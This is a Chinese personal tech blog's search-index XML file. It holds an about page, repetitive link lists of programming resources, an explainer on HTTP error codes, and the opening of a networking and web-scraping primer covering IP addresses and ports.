<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>😋关于我</title>
    <url>/about/</url>
    <content><![CDATA[<p>与其坐在副驾驶，不如自己手握方向盘。</p>
<p>会敲点代码，未来也想做点什么了不起的事情。</p>
<p>喜欢折腾，更喜欢研究，迷失在从无到有的创造感之中….</p>
<img src="http://fp.demo443.com/img/ico/QQ%E5%9B%BE%E7%89%8720210928171256.png" class="lazyload" data-srcset="http://fp.demo443.com/img/ico/QQ%E5%9B%BE%E7%89%8720210928171256.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" align='center' width='200px'/>]]></content>
  </entry>
  <entry>
    <title>🔥开发资料</title>
    <url>/apidocs/</url>
    <content><![CDATA[<div class="btns circle grid5">
            <a class="button" href='https://www.runoob.com/python3/python3-tutorial.html' title='Python3'><img src='/img/icon/python.png'>Python3</a>
<a class="button" href='https://cuiqingcai.com/1319.html' title='Beautiful Soup'><img src='/img/icon/python.png'>Beautiful Soup</a>
<a class="button" href='http://code.py40.com/pyqt5/' title='QyQt5'><img src='/img/icon/pyqt5.png'>QyQt5</a>
<a class="button" href='https://www.w3cschool.cn/opencv/' title='OpenCV文档'><img src='/img/icon/opencv.png'>OpenCV文档</a>
<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

          </div>

]]></content>
  </entry>
  <entry>
    <title>🔥开发资料</title>
    <url>/bat/</url>
    <content><![CDATA[<div class="btns circle grid5">
            <a class="button" href='https://www.runoob.com/python3/python3-tutorial.html' title='Python3'><img src='/img/icon/python.png'>Python3</a>
<a class="button" href='https://cuiqingcai.com/1319.html' title='Beautiful Soup'><img src='/img/icon/python.png'>Beautiful Soup</a>
<a class="button" href='http://code.py40.com/pyqt5/' title='QyQt5'><img src='/img/icon/pyqt5.png'>QyQt5</a>
<a class="button" href='https://www.w3cschool.cn/opencv/' title='OpenCV文档'><img src='/img/icon/opencv.png'>OpenCV文档</a>
<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

          </div>

]]></content>
  </entry>
  <entry>
    <title>🏷️网址收藏</title>
    <url>/friends/</url>
    <content><![CDATA[<div class="btns circle grid5">
            <a class="button" href='https://pypi.org/project/hbase-python/' title='PIP'><img src='/img/icon/python2.png'>PIP</a>

<a class="button" href='https://www.bt.cn/' title='宝塔面板'><img src='/img/icon/baota.png'>宝塔面板</a>

<a class="button" href='https://pypi.org/project/hbase-python/' title='PIP'><img src='/img/icon/python2.png'>PIP</a>

<a class="button" href='https://pypi.org/project/hbase-python/' title='PIP'><img src='/img/icon/python2.png'>PIP</a>

<a class="button" href='https://pypi.org/project/hbase-python/' title='PIP'><img src='/img/icon/python2.png'>PIP</a>

<a class="button" href='https://pypi.org/project/hbase-python/' title='PIP'><img src='/img/icon/python2.png'>PIP</a>









          </div>]]></content>
  </entry>
  <entry>
    <title>🔥开发资料</title>
    <url>/music&amp;videos/</url>
    <content><![CDATA[<div class="btns circle grid5">
            <a class="button" href='https://www.runoob.com/python3/python3-tutorial.html' title='Python3'><img src='/img/icon/python.png'>Python3</a>
<a class="button" href='https://cuiqingcai.com/1319.html' title='Beautiful Soup'><img src='/img/icon/python.png'>Beautiful Soup</a>
<a class="button" href='http://code.py40.com/pyqt5/' title='QyQt5'><img src='/img/icon/pyqt5.png'>QyQt5</a>
<a class="button" href='https://www.w3cschool.cn/opencv/' title='OpenCV文档'><img src='/img/icon/opencv.png'>OpenCV文档</a>
<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

          </div>

]]></content>
  </entry>
  <entry>
    <title>📚学习资料</title>
    <url>/study/</url>
    <content><![CDATA[<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>

<div class="tag link"><a class="link-card" title="冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！" href="https://www.bilibili.com/video/BV1t54y147TL"><div class="left"><img src="/img/icon/python2.png" class="lazyload" data-srcset="/img/icon/python2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">冬季暴汗燃脂第二期。每天6分钟，这个冬天跟着猫叔一起蜕变！</p><p class="url">https://www.bilibili.com/video/BV1t54y147TL</p></div></a></div>
]]></content>
  </entry>
  <entry>
    <title>🔥开发资料</title>
    <url>/sucai/</url>
    <content><![CDATA[<div class="btns circle grid5">
            <a class="button" href='https://www.runoob.com/python3/python3-tutorial.html' title='Python3'><img src='/img/icon/python.png'>Python3</a>
<a class="button" href='https://cuiqingcai.com/1319.html' title='Beautiful Soup'><img src='/img/icon/python.png'>Beautiful Soup</a>
<a class="button" href='http://code.py40.com/pyqt5/' title='QyQt5'><img src='/img/icon/pyqt5.png'>QyQt5</a>
<a class="button" href='https://www.w3cschool.cn/opencv/' title='OpenCV文档'><img src='/img/icon/opencv.png'>OpenCV文档</a>
<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

          </div>

]]></content>
  </entry>
  <entry>
    <title>🔥开发资料</title>
    <url>/tools/</url>
    <content><![CDATA[<div class="btns circle grid5">
            <a class="button" href='https://www.runoob.com/python3/python3-tutorial.html' title='Python3'><img src='/img/icon/python.png'>Python3</a>
<a class="button" href='https://cuiqingcai.com/1319.html' title='Beautiful Soup'><img src='/img/icon/python.png'>Beautiful Soup</a>
<a class="button" href='http://code.py40.com/pyqt5/' title='QyQt5'><img src='/img/icon/pyqt5.png'>QyQt5</a>
<a class="button" href='https://www.w3cschool.cn/opencv/' title='OpenCV文档'><img src='/img/icon/opencv.png'>OpenCV文档</a>
<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

<a class="button" href='https://opencv.org/releases/' title='OpenCV官网'><img src='/img/icon/opencv.png'>OpenCV官网</a>

          </div>

]]></content>
  </entry>
  <entry>
    <title>常见网页错误代码表示的含义</title>
    <url>//%E5%B8%B8%E8%A7%81%E7%BD%91%E9%A1%B5%E9%94%99%E8%AF%AF%E4%BB%A3%E7%A0%81%E8%A1%A8%E7%A4%BA%E7%9A%84%E5%90%AB%E4%B9%89</url>
    <content><![CDATA[<h1 id="常见网页错误400-401-403-404-500网页错误代码表示的含义"><a href="#常见网页错误400-401-403-404-500网页错误代码表示的含义" class="headerlink" title="常见网页错误400/401/403/404/500网页错误代码表示的含义"></a><a href="https://www.cnblogs.com/weimingxin/p/7991646.html">常见网页错误400/401/403/404/500网页错误代码表示的含义</a></h1><h2 id="HTTP-错误-400"><a href="#HTTP-错误-400" class="headerlink" title="HTTP 错误 400"></a>HTTP 错误 400</h2><h3 id="400-请求出错"><a href="#400-请求出错" class="headerlink" title="400 请求出错"></a><strong>400 请求出错</strong></h3><p>由于语法格式有误，服务器无法理解此请求。不作修改，客户程序就无法重复此请求。 </p>
<h3 id="HTTP-错误-401"><a href="#HTTP-错误-401" class="headerlink" title="HTTP 错误 401"></a><strong>HTTP 错误 401</strong></h3><h4 id="401-1-未授权：登录失败"><a href="#401-1-未授权：登录失败" class="headerlink" title="401.1 未授权：登录失败"></a>401.1 未授权：登录失败</h4><p>此错误表明传输给服务器的证书与登录服务器所需的证书不匹配。<br>请与 Web 服务器的管理员联系，以确认您是否具有访问所请求资源的权限。 </p>
<h4 id="401-2-未授权：服务器的配置导致登录失败"><a href="#401-2-未授权：服务器的配置导致登录失败" class="headerlink" title="401.2 未授权：服务器的配置导致登录失败"></a>401.2 未授权：服务器的配置导致登录失败</h4><p>此错误表明传输给服务器的证书与登录服务器所需的证书不匹配。此错误通常由未发送正确的 WWW 验证表头字段所致。<br>请与 Web 服务器的管理员联系，以确认您是否具有访问所请求资源的权限。 </p>
<h4 id="401-3-未授权：由于资源中的-ACL-而未授权"><a href="#401-3-未授权：由于资源中的-ACL-而未授权" class="headerlink" title="401.3 未授权：由于资源中的 ACL 而未授权"></a>401.3 未授权：由于资源中的 ACL 而未授权</h4><p>此错误表明客户所传输的证书没有对服务器中特定资源的访问权限。此资源可能是客户机中的地址行所列出的网页或文件，也可能是处理客户机中的地址行所列出的文件所需服务器上的其他文件。<br>请记录试图访问的完整地址，并与 Web 服务器的管理员联系以确认您是否具有访问所请求资源的权限。 </p>
<h4 id="401-4-未授权：授权服务被筛选程序拒绝"><a href="#401-4-未授权：授权服务被筛选程序拒绝" class="headerlink" title="401.4 未授权：授权服务被筛选程序拒绝"></a>401.4 未授权：授权服务被筛选程序拒绝</h4><p>此错误表明 Web 服务器已经安装了筛选程序，用以验证连接到服务器的用户。此筛选程序拒绝连接到此服务器的真品证书的访问。<br>请记录试图访问的完整地址，并与 Web 服务器的管理员联系以确认您是否具有访问所请求资源的权限。 </p>
<h4 id="401-5-未授权：ISAPI-CGI-应用程序的授权失败"><a href="#401-5-未授权：ISAPI-CGI-应用程序的授权失败" class="headerlink" title="401.5 未授权：ISAPI/CGI 应用程序的授权失败"></a>401.5 未授权：ISAPI/CGI 应用程序的授权失败</h4><p>此错误表明试图使用的 Web服务器中的地址已经安装了 ISAPI 或 CGI程序，在继续之前用以验证用户的证书。此程序拒绝用来连接到服务器的真品证书的访问。<br>请记录试图访问的完整地址，并与 Web服务器的管理员联系以确认您是否具有访问所请求资源的权限 </p>
<h3 id="HTTP-错误-403"><a href="#HTTP-错误-403" class="headerlink" title="HTTP 错误 403"></a><strong>HTTP 错误 403</strong></h3><h4 id="403-1-禁止：禁止执行访问"><a href="#403-1-禁止：禁止执行访问" class="headerlink" title="403.1 禁止：禁止执行访问"></a>403.1 禁止：禁止执行访问</h4><p>如果从并不允许执行程序的目录中执行 CGI、ISAPI或其他执行程序就可能引起此错误。<br>如果问题依然存在，请与 Web 服务器的管理员联系。 </p>
<h4 id="403-2-禁止：禁止读取访问"><a href="#403-2-禁止：禁止读取访问" class="headerlink" title="403.2 禁止：禁止读取访问"></a>403.2 禁止：禁止读取访问</h4><p>如果没有可用的默认网页或未启用此目录的目录浏览，或者试图显示驻留在只标记为执行或脚本权限的目录中的HTML 页时就会导致此错误。<br>如果问题依然存在，请与 Web 服务器的管理员联系。 </p>
<h4 id="403-3-禁止：禁止写访问"><a href="#403-3-禁止：禁止写访问" class="headerlink" title="403.3 禁止：禁止写访问"></a>403.3 禁止：禁止写访问</h4><p>如果试图上载或修改不允许写访问的目录中的文件，就会导致此问题。<br>如果问题依然存在，请与 Web服务器的管理员联系。 </p>
<h4 id="403-4-禁止：需要-SSL"><a href="#403-4-禁止：需要-SSL" class="headerlink" title="403.4 禁止：需要 SSL"></a>403.4 禁止：需要 SSL</h4><p>此错误表明试图访问的网页受安全套接字层（SSL）的保护。要查看，必须在试图访问的地址前输入https:// 以启用 SSL。<br>如果问题依然存在，请与 Web服务器的管理员联系。 </p>
<h4 id="403-5-禁止：需要-SSL-128"><a href="#403-5-禁止：需要-SSL-128" class="headerlink" title="403.5 禁止：需要 SSL 128"></a>403.5 禁止：需要 SSL 128</h4><p>此错误消息表明您试图访问的资源受 128位的安全套接字层（SSL）保护。要查看此资源，需要有支持此SSL 层的<a href="http://www.2cto.com/os/liulanqi/">浏览器</a>。<br>请确认浏览器是否支持 128 位 SSL安全性。如果支持，就与 Web服务器的管理员联系，并报告问题。 </p>
<h4 id="403-6-禁止：拒绝-IP-地址"><a href="#403-6-禁止：拒绝-IP-地址" class="headerlink" title="403.6 禁止：拒绝 IP 地址"></a>403.6 禁止：拒绝 IP 地址</h4><p>如果服务器含有不允许访问此站点的 IP地址列表，并且您正使用的 IP地址在此列表中，就会导致此问题。<br>如果问题依然存在，请与 Web服务器的管理员联系。 </p>
<h4 id="403-7-禁止：需要用户证书"><a href="#403-7-禁止：需要用户证书" class="headerlink" title="403.7 禁止：需要用户证书"></a>403.7 禁止：需要用户证书</h4><p>当试图访问的资源要求浏览器具有服务器可识别的用户安全套接字层（SSL）证书时就会导致此问题。可用来验证您是否为此资源的合法用户。<br>请与 Web服务器的管理员联系以获取有效的用户证书。 </p>
<h4 id="403-8-禁止：禁止站点访问"><a href="#403-8-禁止：禁止站点访问" class="headerlink" title="403.8 禁止：禁止站点访问"></a>403.8 禁止：禁止站点访问</h4><p>如果 Web服务器不为请求提供服务，或您没有连接到此站点的权限时，就会导致此问题。<br>请与 Web 服务器的管理员联系。 </p>
<h4 id="403-9-禁止访问：所连接的用户太多"><a href="#403-9-禁止访问：所连接的用户太多" class="headerlink" title="403.9 禁止访问：所连接的用户太多"></a>403.9 禁止访问：所连接的用户太多</h4><p>如果 Web太忙并且由于流量过大而无法处理您的请求时就会导致此问题。请稍后再次连接。<br>如果问题依然存在，请与 Web 服务器的管理员联系。 </p>
<h4 id="403-10-禁止访问：配置无效"><a href="#403-10-禁止访问：配置无效" class="headerlink" title="403.10 禁止访问：配置无效"></a>403.10 禁止访问：配置无效</h4><p>此时 Web 服务器的配置存在问题。<br>如果问题依然存在，请与 Web服务器的管理员联系。 </p>
<h4 id="403-11-禁止访问：密码已更改"><a href="#403-11-禁止访问：密码已更改" class="headerlink" title="403.11 禁止访问：密码已更改"></a>403.11 禁止访问：密码已更改</h4><p>在身份验证的过程中如果用户输入错误的密码，就会导致此错误。请刷新网页并重试。<br>如果问题依然存在，请与 Web服务器的管理员联系。 </p>
<h4 id="403-12-禁止访问：映射程序拒绝访问"><a href="#403-12-禁止访问：映射程序拒绝访问" class="headerlink" title="403.12 禁止访问：映射程序拒绝访问"></a>403.12 禁止访问：映射程序拒绝访问</h4><p>拒绝用户证书试图访问此 Web 站点。<br>请与站点管理员联系以建立用户证书权限。如果必要，也可以更改用户证书并重试。 </p>
<h3 id="HTTP-错误-404"><a href="#HTTP-错误-404" class="headerlink" title="HTTP 错误 404"></a><strong>HTTP 错误 404</strong></h3><p>404 找不到<br>Web 服务器找不到您所请求的文件或脚本。请检查URL 以确保路径正确。<br>如果问题依然存在，请与服务器的管理员联系。 </p>
<h3 id="HTTP-错误-405"><a href="#HTTP-错误-405" class="headerlink" title="HTTP 错误 405"></a><strong>HTTP 错误 405</strong></h3><p>405 不允许此方法<br>对于请求所标识的资源，不允许使用请求行中所指定的方法。请确保为所请求的资源设置了正确的 MIME 类型。<br>如果问题依然存在，请与服务器的管理员联系。 </p>
<h3 id="HTTP-错误-406"><a href="#HTTP-错误-406" class="headerlink" title="HTTP 错误 406"></a><strong>HTTP 错误 406</strong></h3><p>406 不可接受<br>根据此请求中所发送的“接受”标题，此请求所标识的资源只能生成内容特征为“不可接受”的响应实体。<br>如果问题依然存在，请与服务器的管理员联系。 </p>
<h3 id="HTTP-错误-407"><a href="#HTTP-错误-407" class="headerlink" title="HTTP 错误 407"></a><strong>HTTP 错误 407</strong></h3><p>407 需要代理身份验证<br>在可为此请求提供服务之前，您必须验证此代理服务器。请登录到代理服务器，然后重试。<br>如果问题依然存在，请与 Web 服务器的管理员联系。 </p>
<h3 id="HTTP-错误-412"><a href="#HTTP-错误-412" class="headerlink" title="HTTP 错误 412"></a><strong>HTTP 错误 412</strong></h3><p>412 前提条件失败<br>在服务器上测试前提条件时，部分请求标题字段中所给定的前提条件估计为FALSE。客户机将前提条件放置在当前资源 metainformation（标题字段数据）中，以防止所请求的方法被误用到其他资源。<br>如果问题依然存在，请与 Web 服务器的管理员联系。 </p>
<h3 id="HTTP-错误-414"><a href="#HTTP-错误-414" class="headerlink" title="HTTP 错误 414"></a><strong>HTTP 错误 414</strong></h3><p>414 Request-URI 太长<br>Request-URL太长，服务器拒绝服务此请求。仅在下列条件下才有可能发生此条件：<br>客户机错误地将 POST 请求转换为具有较长的查询信息的 GET 请求。<br>客户机遇到了重定向问题（例如，指向自身的后缀的重定向前缀）。<br>服务器正遭受试图利用某些服务器（将固定长度的缓冲区用于读取或执行 Request-URI）中的安全性<a href="http://www.2cto.com/kf/201107/96225.html">漏洞</a>的客户干扰。<br>如果问题依然存在，请与 Web 服务器的管理员联系。 </p>
<h3 id="HTTP-错误-500"><a href="#HTTP-错误-500" class="headerlink" title="HTTP 错误 500"></a><strong>HTTP 错误 500</strong></h3><p>500 服务器的内部错误<br>Web 服务器不能执行此请求。请稍后重试此请求。<br>如果问题依然存在，请与 Web服务器的管理员联系。 </p>
<h3 id="HTTP-错误-501"><a href="#HTTP-错误-501" class="headerlink" title="HTTP 错误 501"></a><strong>HTTP 错误 501</strong></h3><p>501 未实现<br>Web 服务器不支持实现此请求所需的功能。请检查URL 中的错误，如果问题依然存在，请与 Web服务器的管理员联系。 </p>
<h3 id="HTTP-错误-502"><a href="#HTTP-错误-502" class="headerlink" title="HTTP 错误 502"></a><strong>HTTP 错误 502</strong></h3><p>502 网关出错<br>当用作网关或代理时，服务器将从试图实现此请求时所访问的upstream 服务器中接收无效的响应。<br>如果问题依然存在，请与 Web服务器的管理员联系。</p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>网页错误代码</tag>
      </tags>
  </entry>
  <entry>
    <title>网络通讯协议与爬虫浅谈</title>
    <url>//%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE%E4%B8%8E%E7%88%AC%E8%99%AB%E6%B5%85%E8%B0%88</url>
    <content><![CDATA[<h1 id="网络通讯协议与爬虫浅谈"><a href="#网络通讯协议与爬虫浅谈" class="headerlink" title="网络通讯协议与爬虫浅谈"></a>网络通讯协议与爬虫浅谈</h1><h2 id="网络通信三要素"><a href="#网络通信三要素" class="headerlink" title="网络通信三要素"></a>网络通信三要素</h2><p>IP地址、端口号、协议</p>
<h3 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h3><h4 id="IP地址的作用"><a href="#IP地址的作用" class="headerlink" title="IP地址的作用"></a>IP地址的作用</h4><p>用来在网络中标记一台电脑，比如192.168.1.1；在本地局域网上是唯一的。</p>
<h4 id="IP地址查看"><a href="#IP地址查看" class="headerlink" title="IP地址查看"></a>IP地址查看</h4><p>windows：<br>cmd-&gt;ipconfig<br>linux:<br>ifconfig</p>
<h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><p>端口号：<br>用来唯一标识一个进程。每一个程序都要有一个端口号</p>
<p><img src="./img/20200426000242258.png" class="lazyload" data-srcset="./img/20200426000242258.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200426000242258"></p>
<p>端口号就是一个十进制的整数。</p>
<p>端口号的取值范围是：0到65535</p>
